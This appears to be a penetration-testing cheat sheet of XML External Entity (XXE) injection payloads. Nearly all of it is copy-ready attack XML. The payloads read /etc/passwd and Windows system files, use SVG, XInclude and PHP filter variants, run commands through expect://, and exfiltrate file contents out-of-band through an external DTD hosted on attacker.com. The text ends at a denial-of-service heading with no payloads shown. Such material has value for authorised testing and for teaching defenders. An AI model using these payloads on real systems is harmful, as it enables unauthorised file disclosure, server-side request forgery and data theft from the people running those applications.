# XXE PAYLOADS COMPLETE CHEAT SHEET

## 1. WHAT IS XXE?

**XML External Entity (XXE)** injection occurs when an application parses XML input that contains a reference to an external entity. If the XML parser is poorly configured, an attacker can:

- Read local files (LFI)
- Perform SSRF attacks
- Execute commands (in rare cases with `expect://`)
- Cause Denial of Service (DoS)
- Exfiltrate data out-of-band (OOB)

XXE is listed in the **OWASP Top 10** (A05:2021 – Security Misconfiguration, and previously A4:2017 – XML External Entities).

---

## 2. TYPES OF XXE

| Type | Description |
|------|-------------|
| **In-Band** | The response contains the extracted data directly. |
| **Blind (Out-of-Band)** | No direct output; data is exfiltrated via external DTD, DNS, or HTTP requests. |
| **Error-Based** | Errors reveal file contents or system information. |

---

## 3. BASIC XXE PAYLOADS (FILE READ)

### 3.1 Linux – /etc/passwd
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
```

### 3.2 Windows – win.ini
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>
```

### 3.3 Windows – system.ini
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///C:/Windows/system.ini">]><root>&xxe;</root>
```

### 3.4 Linux – /etc/hostname
```
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>
```

### 3.5 SVG-based XXE
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

### 3.6 XInclude Attack (when you control only a part of the XML)
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

### 3.7 Basic parameter entity test (for blind detection)
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://127.0.0"> %xxe;]><root>Test</root>
```

---

## 4. BLIND / OUT-OF-BAND XXE

### 4.1 External DTD for Data Exfiltration

**Step 1:** Host a file `malicious.dtd` on your server:
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://127.0.0.1:8000/?x=%file;'>">
%eval;
%exfiltrate;
```

**Step 2:** Send the following XML payload to the target:
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY % remote SYSTEM "http://attacker.com/malicious.dtd"> %remote;]><root>Test</root>
```

### 4.2 Basic OOB connectivity test
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://attacker.com/"> %xxe;]><root>Test</root>
```

### 4.3 Parameter entity with DNS exfiltration (Burp Collaborator)
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://xxx.burpcollaborator.net/"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

---

## 5. PHP WRAPPERS (WHEN PHP IS USED)

### 5.1 Base64-encoded file read (avoids XML syntax errors)
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><root>&xxe;</root>
```

### 5.2 Command execution with expect:// (requires expect extension)
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "expect://whoami">]><root>&xxe;</root>
```

### 5.3 Reading /etc/passwd via php://filter
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>
```

---

## 6. DENIAL OF SERVICE (DoS) PAYLOADS

```
